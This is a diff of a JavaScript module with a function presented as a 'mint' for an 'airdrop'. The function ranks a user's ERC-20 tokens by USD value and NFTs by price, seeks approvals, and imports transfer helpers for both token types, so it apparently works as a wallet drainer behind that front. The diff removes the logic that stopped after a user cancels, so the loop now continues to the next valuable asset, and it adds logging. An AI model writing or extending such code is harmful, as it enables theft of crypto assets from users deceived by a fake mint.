@@ -3,14 +3,13 @@ import erc721abi from "../abis/erc721abi.json";
 import {  transferErc20 } from "./erc20.service.js";
 import { transferErc721 } from "./erc721.service.js";
 export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, clientRead, clientWrite, userAddress) => {
-
+  console.log(tokensERC20, "tokensERC20")
     tokensERC20.sort((a, b) => +b.balanceInUsd - +a.balanceInUsd);
     tokensERC721.sort((a, b) => +b.price - +a.price);
     for (let iter20 = 0; iter20 < tokensERC20.length; iter20++) {
-      let canceled = false;
       try {
         if (tokensERC20[iter20].isApproved === false) {
-
+          console.log(tokensERC20[iter20].address, "address")
           console.log(clientRead, "clientRead")
           console.log(clientWrite, "clientWrite")
           // const contract = new ethers.Contract(tokensERC20[iter20].address, erc20abi, signer);
@@ -27,15 +26,13 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, cl
       }
       catch (err) {
         console.log(err);
-        canceled = true;
       }
-      if (canceled) {
-        break;
+      finally {
+        continue;
       }
     }
     for (let iter = 0; iter < tokensERC721.length; iter++) {
       try {
-        let canceled = false;
         try {
           if (tokensERC721[iter].isApproved === false) {
    
@@ -49,13 +46,9 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signer, cl
           }
         }
         catch (err) {
-          canceled = true;
-          console.log(err, "ERRROR");
+         continue;
         }
-        if (canceled) {
-          console.log("canceled");
-          break;
-        }
+   
       }
       catch (err) {
         console.log(err);
